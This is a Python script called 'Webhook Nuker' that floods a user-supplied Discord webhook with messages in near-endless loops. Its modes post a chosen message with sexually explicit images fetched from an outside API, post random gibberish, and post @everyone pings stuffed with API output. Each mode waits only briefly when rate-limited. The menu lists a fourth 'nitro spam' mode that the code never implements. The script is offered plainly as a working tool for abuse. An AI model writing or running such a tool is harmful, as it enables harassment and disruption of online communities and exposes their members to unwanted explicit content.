import requests
import time
import random

print('''

Webhook Nuker
v1.1.5 FMH

1 = hentai hook (and normal)
2 = jibberish spam
3 = hellish spam (ruins discord)
4 = nitro spam (lags servers)
''')
maaain = input("Enter Number : ")
if maaain =="1":
  webhook = input("Enter The Entire Discord Webhook : ")
  time.sleep(.5)
  message = input("Message To Send : ")
  time.sleep(.5)
  quest1 = input("Add Hentai? y/n : ")
  if quest1 =="y":
   name2 = input("Hooks Username : ")
   hh = int(999999999999)
   for i in range(hh):  
     ballsxdxxd3 = random.choice(['https://nekos.life/api/v2/img/boobs','https://nekos.life/api/v2/img/pussy'])
     res = requests.get(f"{ballsxdxxd3}")
     boobs = curl = res.json()["url"]   
     main = f"{message} -- {boobs}"
     h = requests.post(webhook, json={"content": str(main), "name": str(name2), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
     print(f"Message Sent - {h}")
     time.sleep(.5)
     if h.status_code == 429:    
        print(f"Rate Limited {h}")
        time.sleep(3)
  elif quest1 =="n":
    name3 = input("Hooks Username : ")
    he = int(999999999999)
    for i in range(he):
      h = requests.post(webhook, json={"content": str(message), "name": str(name3), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
      time.sleep(.5)
      print(f"Message Sent - {h}")
      if h.status_code == 429:    
        print(f"Rate Limited {h}")
        time.sleep(3)
elif maaain =="2":
  webhook = input("Enter The Entire Discord Webhook : ")
  name2 = input("Name Of Webhook : ")
  time.sleep(.5)
  e = int(999999999) 
  for i in range(e):
    cood43 = "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890?![:#_]") for _ in range(2000))    
    h = requests.post(webhook, json={"content": str(cood43), "name": str(name2), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
    time.sleep(.5)
    print(f"Message Sent - {h}")
    if h.status_code == 429:    
       print(f"Rate Limited {h}")
       
elif maaain =="3":
  webhook = input("Enter The Entire Discord Webhook : ")
  ee = int(999999900)
  name7 = "HELl"
  for i in range(ee):
    cat = requests.get("https://aws.random.cat/meow?ref=apilist.fun")
    dog = requests.get("https://dog.ceo/api/breeds/image/random")
    random1 = requests.get("https://www.boredapi.com/api/activity")
    random2 = requests.get("https://randomuser.me/api/")
    nums = requests.get("http://numbersapi.com/random/math")
    
    
    
    
    messaage = (f"HEHE HEHE @everyone {cat.text}{dog.text}{random1.text}{random2.text}{nums.text} Snake in by booter")
    h = requests.post(webhook, json={"content": str(messaage), "name": str(name7), "avatar_url": "https://cdn.discordapp.com/attachments/933540730083872889/935019209652596736/01d8Ghah.jpg"})
    time.sleep(.5)
    print(f"Message Sent - {h}")
    if h.status_code == 429:    
       print(f"Rate Limited {h}")
    if h.status_code == 400:
      print("More Then 200 Caracters Dectected!")
       
else:
  print("Invalid Responce")

